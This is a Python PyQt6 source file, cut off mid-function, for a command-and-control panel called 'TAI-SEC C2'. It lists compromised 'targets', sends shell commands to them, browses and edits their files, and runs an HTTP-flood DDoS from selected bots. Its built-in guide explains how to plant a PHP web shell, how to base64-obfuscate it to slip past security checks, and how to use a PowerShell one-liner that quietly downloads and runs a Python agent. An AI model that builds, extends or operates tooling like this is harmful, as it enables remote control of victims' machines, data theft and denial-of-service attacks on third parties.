import sys
import json
import os
import re
import base64
import requests # Added this import
import subprocess # Added this import
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout,
    QPushButton, QLabel, QListWidget, QStackedWidget, QLineEdit, QTextEdit,
    QDialog, QFormLayout, QMessageBox, QListWidgetItem, QTableWidget, QTableWidgetItem, 
    QGraphicsOpacityEffect, QComboBox, QCheckBox, QTreeWidget, QTreeWidgetItem, QHeaderView, QSplitter, QMenu, QInputDialog, QFileDialog,
    QSlider, QSpinBox
)
from PyQt6.QtCore import Qt, pyqtSignal, QRegularExpression, QTimer, QObject, QEasingCurve, QPropertyAnimation, QThread
from PyQt6.QtGui import QFont, QColor, QTextCharFormat, QSyntaxHighlighter, QTextDocument
import qtawesome as qta
import threading

from target_manager import TargetManager, AddEditTargetDialog
from c2_client import C2Client # Import C2Client from new file
from payload_generator import PayloadGenerator
from speedometer import SpeedometerWidget
from gauge import GaugeWidget
from signal_strength import SignalStrengthWidget
from gauges_window import GaugesWindow

# CONFIGURATION
HEARTBEAT_INTERVAL = 10000 # 10 seconds in milliseconds
CURRENT_VERSION = "0.1"
VERSION_URL = "https://raw.githubusercontent.com/TAI-Sec/c2panel/main/version.txt"

class UpdateCheckWorker(QObject):
    finished = pyqtSignal(str)

    def run(self):
        try:
            response = requests.get(VERSION_URL, timeout=5)
            if response.status_code == 200:
                latest_version = response.text.strip()
                self.finished.emit(latest_version)
            else:
                self.finished.emit("")
        except requests.exceptions.RequestException:
            self.finished.emit("")

class AnsiToHtmlConverter:
    ANSI_COLORS = {
        '30': '#2B2B2B', '31': '#E74C3C', '32': '#2ECC71', '33': '#F1C40F',
        '34': '#3498DB', '35': '#9B59B6', '36': '#34E7E7', '37': '#E0E0E0',
        '90': '#95A5A6', '91': '#EC7063', '92': '#58D68D', '93': '#F7DC6F',
        '94': '#5DADE2', '95': '#BB8FCE', '96': '#48C9B0', '97': '#FFFFFF',
    }

    def __init__(self):
        self.is_open = False

    def _close_span(self):
        if self.is_open:
            self.is_open = False
            return '</span>'
        return ''

    def convert(self, text):
        # First, escape HTML special characters to prevent rendering issues
        text = text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        
        # Replace newlines with <br> for HTML
        text = text.replace('\n', '<br>')

        def repl(m):
            code = m.group(1)
            # Handle multi-parameter codes like '1;31'
            codes = code.split(';')
            # For simplicity, we only care about the color code
            color_code = codes[-1]

            if color_code == '0':
                return self._close_span()
            if color_code in self.ANSI_COLORS:
                color = self.ANSI_COLORS[color_code]
                # Close previous span if any, then open a new one
                result = f'{self._close_span()}<span style="color:{color}">'
                self.is_open = True
                return result
            return '' # Ignore other codes

        # Regex to find ANSI color codes
        text = re.sub(r'\x1b\[([\d;]*)m', repl, text)
        
        # Ensure any open span is closed at the end
        text += self._close_span()
        return text

class HeartbeatWorker(QObject):
    finished = pyqtSignal(dict) # Emits the full response dictionary

    def __init__(self, target, c2_client):
        super().__init__()
        self.target = target
        self.c2_client = c2_client

    def run(self):
        import time
        start_time = time.time()
        response = self.c2_client.send_heartbeat(self.target)
        end_time = time.time()
        latency = (end_time - start_time) * 1000 # in ms

        # Add the target_id and latency to the response so the handler knows which target it was for
        if response:
            response['target_id'] = self.target['id']
            response['latency'] = latency
        else:
            response = {'status': 'error', 'target_id': self.target['id'], 'latency': latency}
        self.finished.emit(response)

class C2SyntaxHighlighter(QSyntaxHighlighter):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.highlighting_rules = []

        # Keywords
        keyword_format = QTextCharFormat()
        keyword_format.setForeground(QColor("#00A0E5")) # Blue
        keywords = ["if", "else", "while", "for", "in", "return", "def", "class", "import", "from", "as", "try", "except", "finally", "with", "as", "print", "echo"]
        for word in keywords:
            pattern = QRegularExpression(f"\\b{word}\\b")
            self.highlighting_rules.append((pattern, keyword_format))

        # Operators
        operator_format = QTextCharFormat()
        operator_format.setForeground(QColor("#E0E0E0")) # Light Grey
        operators = ["=", "==", "!=", "<", ">", "<=", ">=", r"\+", "-", r"\*", "/", "%", r"\*\*", "//", "and", "or", "not"]
        for op in operators:
            pattern = QRegularExpression(f"\\b{op}\\b")
            self.highlighting_rules.append((pattern, operator_format))

        # Strings
        string_format = QTextCharFormat()
        string_format.setForeground(QColor("#F1C40F")) # Yellow
        self.highlighting_rules.append((QRegularExpression(r'"[^"]*"'), string_format))
        self.highlighting_rules.append((QRegularExpression(r"'[^']*'"), string_format))

        # Comments
        comment_format = QTextCharFormat()
        comment_format.setForeground(QColor("#95A5A6")) # Grey
        self.highlighting_rules.append((QRegularExpression("#.*"), comment_format))

        # Functions
        function_format = QTextCharFormat()
        function_format.setForeground(QColor("#58D68D")) # Green
        self.highlighting_rules.append((QRegularExpression("\\b[A-Za-z0-9_]+(?=\\()") , function_format))

    def highlightBlock(self, text):
        for pattern, format in self.highlighting_rules:
            i = pattern.globalMatch(text)
            while i.hasNext():
                match = i.next()
                self.setFormat(match.capturedStart(), match.capturedLength(), format)

class C2Panel(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("TAI-SEC C2panel")

        # Get screen dimensions and set initial size
        screen = QApplication.primaryScreen().availableGeometry()
        self.setGeometry(0, 0, int(screen.width() * 0.8), int(screen.height() * 0.8))
        # Center the window
        self.move(screen.center() - self.frameGeometry().center())

        self.target_manager = TargetManager()
        self.c2_client = C2Client() # Initialize C2Client
        self.ansi_converter = AnsiToHtmlConverter()
        self.payload_generator = PayloadGenerator()
        self.thread_pool = []
        self._is_updating_table = False # Flag to prevent re-entrant signal handling
        self.current_fm_target = None
        self.current_open_file_path = None
        self.gauges_window = None
        self.is_shutting_down = False

        self.init_ui()
        self.load_target_list()

        # Connect signals
        self.target_table_widget.itemChanged.connect(self.handle_item_changed)

        # Setup heartbeat timer
        self.heartbeat_timer = QTimer(self)
        self.heartbeat_timer.timeout.connect(self.check_all_target_statuses)
        self.heartbeat_timer.start(HEARTBEAT_INTERVAL)

        # Check for updates on startup
        self.check_for_updates()

    def check_for_updates(self):
        self.update_worker = UpdateCheckWorker()
        self.update_thread = QThread()
        self.update_worker.moveToThread(self.update_thread)
        
        self.update_thread.started.connect(self.update_worker.run)
        self.update_worker.finished.connect(self.handle_update_check_result)
        self.update_worker.finished.connect(self.update_thread.quit)
        
        self.update_thread.start()

    def handle_update_check_result(self, latest_version):
        if not latest_version:
            print("Could not fetch latest version information.")
            return

        # Simple version comparison
        try:
            latest_v = list(map(int, latest_version.split('.')))
            current_v = list(map(int, CURRENT_VERSION.split('.')))
            
            if latest_v > current_v:
                print(f"New version found: {latest_version}")
                msg_box = QMessageBox(self)
                msg_box.setWindowTitle("Update Available")
                msg_box.setText(f"A new version ({latest_version}) is available.\nYou are using version {CURRENT_VERSION}.")
                msg_box.setInformativeText("Do you want to update now?")
                update_button = msg_box.addButton("Update Now", QMessageBox.ButtonRole.YesRole)
                later_button = msg_box.addButton("Later", QMessageBox.ButtonRole.NoRole)
                msg_box.setDefaultButton(update_button)
                
                msg_box.exec()
                
                if msg_box.clickedButton() == update_button:
                    self.perform_update()
            else:
                print("You are using the latest version.")
        except (ValueError, IndexError):
            print(f"Invalid version format received: {latest_version}")

    def perform_update(self):
        print("Attempting to update using 'git pull'...")
        try:
            # We use subprocess.run to execute the git pull command
            result = subprocess.run(['git', 'pull'], capture_output=True, text=True, check=True)
            print(result.stdout)
            QMessageBox.information(self, "Update Successful", "The application has been updated successfully.\n\nPlease restart the application to apply the changes.")
        except FileNotFoundError:
            QMessageBox.critical(self, "Update Failed", "Error: 'git' command not found. Please make sure Git is installed and in your system's PATH.")
        except subprocess.CalledProcessError as e:
            QMessageBox.critical(self, "Update Failed", f"An error occurred while running 'git pull':\n\n{e.stderr}")
        except Exception as e:
            QMessageBox.critical(self, "Update Failed", f"An unexpected error occurred: {str(e)}")

    def closeEvent(self, event):
        if self.is_shutting_down:
            event.accept()
            return

        print("Closing application, initiating graceful shutdown...")
        self.is_shutting_down = True
        self.heartbeat_timer.stop()

        running_threads = [t for t, w in self.thread_pool if t.isRunning()]

        if not running_threads:
            print("No active threads. Exiting immediately.")
            event.accept()
            return

        print(f"Asking {len(running_threads)} threads to quit...")
        # Ask all threads to quit. The on_thread_finished will handle the final exit.
        for thread in running_threads:
            thread.quit()

        # Hide the window and ignore the event for now.
        # The app will be closed programmatically when the last thread finishes.
        self.hide()
        event.ignore()


    def init_ui(self):
        # Main Widget and Layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # --- Sidebar --- #
        sidebar_widget = QWidget()
        sidebar_widget.setObjectName("sidebar")
        sidebar_widget.setFixedWidth(200)
        sidebar_layout = QVBoxLayout(sidebar_widget)
        sidebar_layout.setContentsMargins(0, 10, 0, 10)
        sidebar_layout.setSpacing(5)

        self.logo_label = QLabel("TAI-SEC C2")
        self.logo_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.logo_label.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        sidebar_layout.addWidget(self.logo_label)

        # Sidebar buttons
        self.btn_targets = QPushButton(qta.icon('fa5s.crosshairs', color='#FFFFFF'), " Targets")
        self.btn_terminal = QPushButton(qta.icon('fa5s.terminal', color='#FFFFFF'), " Terminal")
        self.btn_payloads = QPushButton(qta.icon('fa5s.file-code', color='#FFFFFF'), " Payloads")
        self.btn_file_manager = QPushButton(qta.icon('fa5s.folder-open', color='#FFFFFF'), " File Manager")
        self.btn_ddos = QPushButton(qta.icon('fa5s.bolt', color='#FFFFFF'), " DDoS Attack")
        self.btn_instructions = QPushButton(qta.icon('fa5s.info-circle', color='#FFFFFF'), " Instructions")

        sidebar_buttons = [self.btn_targets, self.btn_terminal, self.btn_payloads, self.btn_file_manager, self.btn_ddos, self.btn_instructions]
        for btn in sidebar_buttons:
            btn.setObjectName("sidebar_button")
            sidebar_layout.addWidget(btn)

        sidebar_layout.addStretch()

        self.btn_update = QPushButton(qta.icon('fa5s.sync-alt', color='#FFFFFF'), " Update")
        self.btn_update.setObjectName("sidebar_button")
        self.btn_update.clicked.connect(self.perform_update)
        sidebar_layout.addWidget(self.btn_update)

        self.btn_quit = QPushButton(qta.icon('fa5s.sign-out-alt', color='#FFFFFF'), " Quit")
        self.btn_quit.setObjectName("sidebar_button")
        self.btn_quit.clicked.connect(self.close) # Triggers the closeEvent
        sidebar_layout.addWidget(self.btn_quit)

        self.footer_label = QLabel("© TAI-SEC")
        self.footer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sidebar_layout.addWidget(self.footer_label)

        main_layout.addWidget(sidebar_widget)

        # --- Content Area --- #
        self.stacked_widget = QStackedWidget()
        main_layout.addWidget(self.stacked_widget)

        # --- Views --- #
        self.targets_view = QWidget()
        self.terminal_view = QWidget()
        self.payload_view = QWidget()
        self.file_manager_view = QWidget()
        self.ddos_view = QWidget()
        self.instructions_view = QWidget()

        self.stacked_widget.addWidget(self.targets_view)
        self.stacked_widget.addWidget(self.terminal_view)
        self.stacked_widget.addWidget(self.payload_view)
        self.stacked_widget.addWidget(self.file_manager_view)
        self.stacked_widget.addWidget(self.ddos_view)
        self.stacked_widget.addWidget(self.instructions_view)

        # Connect buttons to switch views
        self.btn_targets.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))
        self.btn_terminal.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(1))
        self.btn_payloads.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(2))
        self.btn_file_manager.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(3))
        self.btn_ddos.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(4))
        self.btn_instructions.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(5))

        # Initialize UI for each view
        self.init_targets_ui()
        self.init_terminal_ui()
        self.init_payload_generator_ui()
        self.init_file_manager_ui()
        self.init_ddos_ui()
        self.init_instructions_ui()

        self.stacked_widget.currentChanged.connect(self.fm_tab_selected)

        # Apply theme
        self.apply_dark_theme()

    def init_targets_ui(self):
        targets_layout = QVBoxLayout(self.targets_view)
        
        self.add_target_btn = QPushButton(qta.icon('fa5s.plus', color='white'), " Add New Target")
        self.add_target_btn.clicked.connect(self.open_add_edit_target_dialog)
        
        self.show_gauges_btn = QPushButton(qta.icon('fa5s.tachometer-alt', color='white'), " Show Gauges")
        self.show_gauges_btn.clicked.connect(self.show_gauges_window)

        btn_layout = QHBoxLayout()
        btn_layout.addStretch()
        btn_layout.addWidget(self.add_target_btn)
        btn_layout.addWidget(self.show_gauges_btn)
        targets_layout.addLayout(btn_layout)

        self.target_table_widget = QTableWidget()
        self.target_table_widget.setColumnCount(7)
        self.target_table_widget.setHorizontalHeaderLabels(["", "ID", "Name", "URL", "IP", "Uptime", "Status"])
        self.target_table_widget.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.target_table_widget.itemDoubleClicked.connect(self.show_target_details)
        self.target_table_widget.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.target_table_widget.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Interactive)
        self.target_table_widget.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Interactive)
        self.target_table_widget.setColumnWidth(0, 40)
        self.target_table_widget.setColumnWidth(1, 50)
        targets_layout.addWidget(self.target_table_widget)

    def show_gauges_window(self):
        selected_items = self.target_table_widget.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Target Selected", "Please select a target from the list first.")
            return

        row = selected_items[0].row()
        target_id = int(self.target_table_widget.item(row, 1).text())
        target = self.target_manager.get_target(target_id)

        if target:
            self.gauges_window = GaugesWindow(target)
            self.gauges_window.show()

    def init_terminal_ui(self):
        terminal_layout = QVBoxLayout(self.terminal_view)
        self.terminal_output = QTextEdit()
        self.terminal_output.setReadOnly(True)
        self.terminal_output.setFont(QFont("Consolas", 11))
        # self.highlighter = C2SyntaxHighlighter(self.terminal_output.document()) # Optional
        terminal_layout.addWidget(self.terminal_output)

        terminal_input_layout = QHBoxLayout()
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command...")
        self.command_input.returnPressed.connect(self.send_command)
        terminal_input_layout.addWidget(self.command_input)

        self.send_command_btn = QPushButton(qta.icon('fa5s.paper-plane', color='white'), " Send")
        self.send_command_btn.clicked.connect(self.send_command)
        terminal_input_layout.addWidget(self.send_command_btn)
        terminal_layout.addLayout(terminal_input_layout)

    def init_payload_generator_ui(self):
        layout = QVBoxLayout(self.payload_view)
        label = QLabel("Payload Generator is temporarily disabled while issues are being investigated.")
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        label.setStyleSheet("font-size: 16px; color: #95A5A6;")
        layout.addWidget(label)

    def update_payload_ui_fields(self, index):
        payload_type = self.payload_type_combo.itemText(index)
        
        # Hide all specific fields first
        self.python_listen_port_input.setVisible(False)
        self.powershell_python_agent_url_input.setVisible(False)
        self.obfuscate_checkbox.setVisible(True) # PHP obfuscation is always an option

        if payload_type == "PHP - Web Shell":
            self.obfuscate_checkbox.setVisible(True)
        elif payload_type == "Python - HTTP Agent":
            self.python_listen_port_input.setVisible(True)
            self.obfuscate_checkbox.setVisible(False) # No obfuscation for Python agent for now
        elif payload_type == "Windows - PowerShell Downloader":
            self.powershell_python_agent_url_input.setVisible(True)
            self.obfuscate_checkbox.setVisible(False) # No obfuscation for PowerShell downloader


    def init_file_manager_ui(self):
        layout = QVBoxLayout(self.file_manager_view)
        title_label = QLabel("File Manager")
        title_label.setObjectName("view_title")
        layout.addWidget(title_label)

        path_layout = QHBoxLayout()
        self.fm_path_input = QLineEdit()
        self.fm_path_input.setPlaceholderText("Enter path...")
        self.fm_path_input.returnPressed.connect(self.fm_go_to_path)
        path_layout.addWidget(self.fm_path_input)

        self.fm_go_btn = QPushButton("Go")
        self.fm_go_btn.clicked.connect(self.fm_go_to_path)
        path_layout.addWidget(self.fm_go_btn)
        
        self.fm_back_btn = QPushButton(qta.icon('fa5s.arrow-left'), "")
        self.fm_back_btn.clicked.connect(self.fm_go_back)
        path_layout.addWidget(self.fm_back_btn)

        layout.addLayout(path_layout)

        fm_main_layout = QHBoxLayout()

        # Left side (File tree and action buttons)
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0,0,0,0)

        self.fm_tree = QTreeWidget()
        self.fm_tree.setHeaderLabels(["Name", "Type", "Size", "Permissions"])
        self.fm_tree.itemDoubleClicked.connect(self.fm_tree_item_double_clicked)
        self.fm_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.fm_tree.customContextMenuRequested.connect(self.fm_show_context_menu)
        self.fm_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.fm_tree.header().setSectionResizeMode(0, QHeaderView.ResizeMode.Interactive)
        left_layout.addWidget(self.fm_tree)

        fm_button_layout = QGridLayout()
        self.fm_upload_btn = QPushButton(qta.icon('fa5s.upload'), " Upload")
        self.fm_upload_btn.clicked.connect(self.fm_upload_file)
        fm_button_layout.addWidget(self.fm_upload_btn, 0, 0)

        self.fm_delete_btn = QPushButton(qta.icon('fa5s.trash'), " Delete")
        self.fm_delete_btn.clicked.connect(self.fm_delete_path)
        fm_button_layout.addWidget(self.fm_delete_btn, 0, 1)

        self.fm_new_folder_btn = QPushButton(qta.icon('fa5s.folder-plus'), " New Folder")
        self.fm_new_folder_btn.clicked.connect(self.fm_create_directory)
        fm_button_layout.addWidget(self.fm_new_folder_btn, 1, 0)

        self.fm_new_file_btn = QPushButton(qta.icon('fa5s.file-alt'), " New File")
        self.fm_new_file_btn.clicked.connect(self.fm_create_file)
        fm_button_layout.addWidget(self.fm_new_file_btn, 1, 1)
        left_layout.addLayout(fm_button_layout)

        fm_main_layout.addWidget(left_panel, 1)

        # Right side (File content view)
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0,0,0,0)

        self.fm_content_view = QTextEdit()
        self.fm_content_view.setFont(QFont("Consolas", 10))
        self.fm_content_view.textChanged.connect(self.fm_content_changed)
        right_layout.addWidget(self.fm_content_view)

        self.fm_save_btn = QPushButton(qta.icon('fa5s.save'), " Save Changes")
        self.fm_save_btn.clicked.connect(self.fm_save_file)
        self.fm_save_btn.setEnabled(False)
        right_layout.addWidget(self.fm_save_btn)

        fm_main_layout.addWidget(right_panel, 2)

        layout.addLayout(fm_main_layout)

    def init_ddos_ui(self):
        # This view is enabled/disabled based on target selection in handle_item_changed
        layout = QVBoxLayout(self.ddos_view)

        title_label = QLabel("DDoS Attack Module")
        title_label.setObjectName("view_title")
        layout.addWidget(title_label)

        # Form for attack parameters
        form_layout = QFormLayout()
        form_layout.setContentsMargins(0, 20, 0, 20)
        form_layout.setSpacing(15)
        layout.addLayout(form_layout)

        self.ddos_host_input = QLineEdit()
        self.ddos_host_input.setPlaceholderText("e.g., 1.1.1.1 or example.com")
        form_layout.addRow(QLabel("Target Host:"), self.ddos_host_input)

        self.ddos_port_input = QSpinBox()
        self.ddos_port_input.setRange(1, 65535)
        self.ddos_port_input.setValue(80)
        form_layout.addRow(QLabel("Port:"), self.ddos_port_input)

        self.ddos_threads_input = QSpinBox()
        self.ddos_threads_input.setRange(1, 500)
        self.ddos_threads_input.setValue(50)
        form_layout.addRow(QLabel("Threads / Connections:"), self.ddos_threads_input)

        # Action Buttons
        button_layout = QHBoxLayout()
        self.ddos_start_btn = QPushButton(qta.icon('fa5s.play-circle'), " START ATTACK")
        self.ddos_start_btn.setObjectName("start_button")
        self.ddos_start_btn.clicked.connect(self.start_ddos_attack)

        self.ddos_stop_btn = QPushButton(qta.icon('fa5s.stop-circle'), " STOP ATTACK")
        self.ddos_stop_btn.setObjectName("stop_button")
        self.ddos_stop_btn.clicked.connect(self.stop_ddos_attack)

        button_layout.addStretch()
        button_layout.addWidget(self.ddos_start_btn)
        button_layout.addWidget(self.ddos_stop_btn)
        button_layout.addStretch()
        layout.addLayout(button_layout)

        layout.addStretch() # Pushes everything to the top

    def init_instructions_ui(self):
        layout = QVBoxLayout(self.instructions_view)
        
        text_edit = QTextEdit()
        text_edit.setReadOnly(True)
        
        instructions_html = """
        <html>
        <body style='color: #E0E0E0; font-family: Arial; font-size: 14px;'>
            <h1 style='color: #00A0E5;'>TAI-SEC C2 - Quick Guide</h1>
            <p>Hey there! Welcome to the TAI-SEC C2 Panel. This tool is designed to give you an easy-to-use interface for managing your remote agents. Here’s a quick rundown of how to get everything up and running.</p>

            <h2 style='color: #58D68D;'>1. Getting Started: Adding Targets</h2>
            <p>This is your main dashboard. First things first, you need to add an agent to control.</p>
            <ul>
                <li>Click the '<b>Add New Target</b>' button in the 'Targets' tab.</li>
                <li><b>For a PHP Agent:</b> If you're using the classic PHP web shell, just drop the <code>c2.php</code> file on your target web server. The URL you enter here should point directly to that file (e.g., <code>http://example.com/c2.php</code>).</li>
                <li><b>For a Python Agent:</b> If you're using the new Python HTTP agent, you'll first generate it from the 'Payloads' tab. Run it on your target machine. The URL you enter here will be the IP and port of your target machine where the agent is listening (e.g., <code>http://192.168.1.50:8000</code>).</li>
                <li>The <b>API Key</b> should match the one in your agent script (the default is <code>TAI-SEC</code>).</li>
                <li>Once added, the panel will ping it every 10 seconds. A green '● Online' status means you're good to go.</li>
            </ul>

            <h2 style='color: #58D68D;'>2. Using the Terminal</h2>
            <p>This one's pretty straightforward. In the 'Targets' tab, just check the box next to one or more targets you want to command. Whatever you type in the terminal here gets sent to all of them. The output will show up, tagged with the agent's name.</p>

            <h2 style='color: #58D68D;'>3. File Manager</h2>
            <p>To use the file manager, you need to select a <b>single target</b> from the 'Targets' tab first. The file manager works one-on-one.</p>
            <ul>
                <li>Double-click a folder to browse into it, or double-click a file to view its contents in the editor on the right.</li>
                <li>You can edit text files directly and hit '<b>Save Changes</b>'.</li>
                <li>You can also upload, delete, rename, and create new files/folders. Just right-click on an item for more options or use the buttons at the bottom.</li>
            </ul>

            <h2 style='color: #58D68D;'>4. DDoS Module</h2>
            <p>Alright, the fun part. This module lets you launch a multi-threaded HTTP flood attack from your selected agents.</p>
            <ul>
                <li>First, select one or more of your online agents in the 'Targets' tab.</li>
                <li>Head over to the '<b>DDoS Attack</b>' tab.</li>
                <li>Fill in the victim's IP/Host, the port, and how many connections (threads) each agent should open.</li>
                <li>Hit '<b>START ATTACK</b>'. The panel will automatically switch to the terminal to show you the confirmation from each bot.</li>
            </ul>
            <p style='color: #E74C3C;'><b>Warning:</b> This is a powerful tool. Use it responsibly and legally. Don't go breaking things you don't own. We're not responsible for how you use this.</p>

            <h2 style='color: #58D68D;'>5. Payload Generator</h2>
            <p>This is where you cook up your agents.</p>
            <ul>
                <li><b>PHP - Web Shell:</b> The classic. This generates the <code>c2.php</code> code. You can choose to 'obfuscate' it, which just wraps it in base64. Simple, but can sometimes bypass basic security checks.</li>
                <li><b>Python - HTTP Agent:</b> This generates a standalone Python script that acts just like the PHP agent but doesn't need a web server. You'll need to pick a port for it to listen on. <b>Important:</b> The target machine needs Python and the <code>pycryptodome</code> library installed (<code>pip install pycryptodome</code>).</li>
                <li><b>Windows - PowerShell Downloader:</b> This is a handy one-liner for Windows targets. First, you need to generate the Python HTTP Agent and host that <code>.py</code> file somewhere (like on a simple Python web server or a raw Pastebin link). Then, you generate this payload, giving it the URL to your hosted <code>.py</code> file. When you run the PowerShell command on the target, it'll download and execute the Python agent in the background. Sneaky.</li>
            </ul>
            
            <br>
            <p>That's about it! Explore, experiment, and have fun. Stay safe.</p>
        </body>
        </html>
        """
        text_edit.setHtml(instructions_html)
        layout.addWidget(text_edit)

    def apply_dark_theme(self):
        self.setStyleSheet("""
            /* Main Window */
            QMainWindow { background-color: #2B2B2B; }
            
            /* All Widgets */
            QWidget { color: #E0E0E0; font-family: Arial; font-size: 12px; }

            /* Titles */
            QLabel#view_title { font-size: 20px; font-weight: bold; padding-bottom: 10px; }

            /* Sidebar */
            QWidget#sidebar { background-color: #333333; }
            QLabel { color: #E0E0E0; }
            #logo_label { color: #00A0E5; }
            #footer_label { color: #95A5A6; font-size: 10px; }
            
            QPushButton#sidebar_button {
                background-color: transparent;
                color: #FFFFFF;
                text-align: left;
                padding: 12px 20px;
                border: none;
                font-size: 14px;
                border-left: 3px solid transparent;
            }
            QPushButton#sidebar_button:hover { background-color: #444444; }
            QPushButton#sidebar_button:checked {
                background-color: #2B2B2B;
                border-left: 3px solid #00A0E5;
            }

            /* Content Views */
            QStackedWidget > QWidget { background-color: #2B2B2B; padding: 20px; }

            /* Buttons */
            QPushButton {
                background-color: #007ACC;
                color: white;
                padding: 10px;
                border-radius: 5px;
                border: none;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #00A0E5; }
            QPushButton:disabled { background-color: #555555; color: #999999; }
            #start_button { background-color: #2ECC71; } /* Green */
            #start_button:hover { background-color: #58D68D; }
            #stop_button { background-color: #E74C3C; } /* Red */
            #stop_button:hover { background-color: #EC7063; }

            /* Inputs */
            QLineEdit, QTextEdit, QSpinBox, QComboBox {
                background-color: #3C3C3C;
                color: #E0E0E0;
                border: 1px solid #555555;
                padding: 8px;
                border-radius: 5px;
            }
            QLineEdit:focus, QTextEdit:focus, QSpinBox:focus, QComboBox:focus {
                border: 1px solid #00A0E5;
            }
            QComboBox::drop-down { border: none; }
            QComboBox::down-arrow { image: url(down_arrow.png); } /* Placeholder */

            /* Table */
            QTableWidget {
                background-color: #3C3C3C;
                border: 1px solid #555555;
                border-radius: 5px;
                gridline-color: #555555;
            }
            QTableWidget::item { padding: 8px; border-bottom: 1px solid #555555; }
            QTableWidget::item:selected { background-color: #007ACC; color: white; }
            QHeaderView::section {
                background-color: #333333;
                color: #FFFFFF;
                padding: 8px;
                border: 1px solid #555555;
                font-weight: bold;
            }

            /* Tree Widget (File Manager) */
            QTreeWidget { background-color: #3C3C3C; border: 1px solid #555; }
            QTreeWidget::item:hover { background-color: #444; }
            QTreeWidget::item:selected { background-color: #007ACC; }

            /* Slider */
            QSlider::groove:horizontal {
                border: 1px solid #555;
                height: 8px;
                background: #3C3C3C;
                margin: 2px 0;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #00A0E5;
                border: 1px solid #00A0E5;
                width: 18px;
                margin: -5px 0;
                border-radius: 9px;
            }

            /* Scrollbars */
            QScrollBar:vertical {
                border: none;
                background: #3C3C3C;
                width: 12px;
                margin: 0px 0px 0px 0px;
            }
            QScrollBar::handle:vertical {
                background: #555555;
                min-height: 20px;
                border-radius: 6px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                height: 0px;
            }
        """)
        # Make sidebar buttons checkable to show active state
        for btn in self.findChildren(QPushButton):
            if btn.objectName() == "sidebar_button":
                btn.setCheckable(True)
        self.btn_targets.setChecked(True) # Set initial active button

    def fm_tab_selected(self, index):
        if self.stacked_widget.widget(index) == self.file_manager_view:
            selected_targets = self.get_selected_targets()
            if not selected_targets:
                self.fm_tree.clear()
                self.fm_path_input.clear()
                self.fm_content_view.clear()
                QMessageBox.warning(self, "No Target", "Please select a target from the Targets tab first.")
                return
            
            self.current_fm_target = selected_targets[0] # Use the first selected target
            self.fm_load_directory(".") # Load root directory

    def fm_go_to_path(self):
        path = self.fm_path_input.text()
        if path:
            self.fm_load_directory(path)

    def fm_go_back(self):
        current_path = self.fm_path_input.text()
        if not current_path or current_path == '.':
            return
        parent_path = os.path.dirname(current_path)
        if not parent_path:
            parent_path = '.'
        self.fm_load_directory(parent_path)

    def fm_tree_item_double_clicked(self, item, column):
        item_type = item.text(1)
        item_name = item.text(0)
        current_path = self.fm_path_input.text()
        # Handle root path correctly
        if current_path == '.':
            full_path = item_name
        else:
            full_path = os.path.join(current_path, item_name)

        if item_type == 'dir':
            self.fm_load_directory(full_path)
        elif item_type == 'file':
            self.fm_load_file(full_path)

    def fm_load_directory(self, path):
        if not self.current_fm_target:
            return

        self.fm_tree.clear()
        response = self.c2_client.list_directory(self.current_fm_target, path)

        if response and response.get('status') == 'success' and response.get('type') == 'filemanager_ls':
            self.fm_path_input.setText(response.get('path', path))
            for entry in response.get('data', []):
                item = QTreeWidgetItem(self.fm_tree)
                item.setText(0, entry['name'])
                item.setText(1, entry['type'])
                item.setText(2, str(entry['size']))
                item.setText(3, entry['perms'])
                if entry['type'] == 'dir':
                    item.setForeground(0, QColor("#5DADE2")) # Blue for dirs
                else:
                    item.setForeground(0, QColor("#E0E0E0")) # White for files
        else:
            error_message = response.get('message', 'Failed to list directory.')
            QMessageBox.critical(self, "Error", f"Could not list directory '{path}':\n{error_message}")

    def fm_load_file(self, path):
        if not self.current_fm_target:
            return

        response = self.c2_client.get_file_content(self.current_fm_target, path)

        if response and response.get('status') == 'success' and response.get('type') == 'filemanager_cat':
            try:
                content = base64.b64decode(response.get('data', '')).decode('utf-8', 'ignore')
                self.fm_content_view.textChanged.disconnect()
                self.fm_content_view.setPlainText(content)
                self.current_open_file_path = path
                self.fm_save_btn.setEnabled(False)
                self.fm_content_view.textChanged.connect(self.fm_content_changed)
            except Exception as e:
                self.fm_content_view.setPlainText(f"Error decoding file content: {e}")
        else:
            error_message = response.get('message', 'Failed to load file.')
            QMessageBox.critical(self, "Error", f"Could not load file '{path}':\n{error_message}")

    def fm_content_changed(self):
        self.fm_save_btn.setEnabled(True)

    def fm_save_file(self):
        if not self.current_open_file_path:
            return

        content = self.fm_content_view.toPlainText()
        encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')

        response = self.c2_client.upload_file(self.current_fm_target, self.current_open_file_path, encoded_content)

        if response and response.get('status') == 'success':
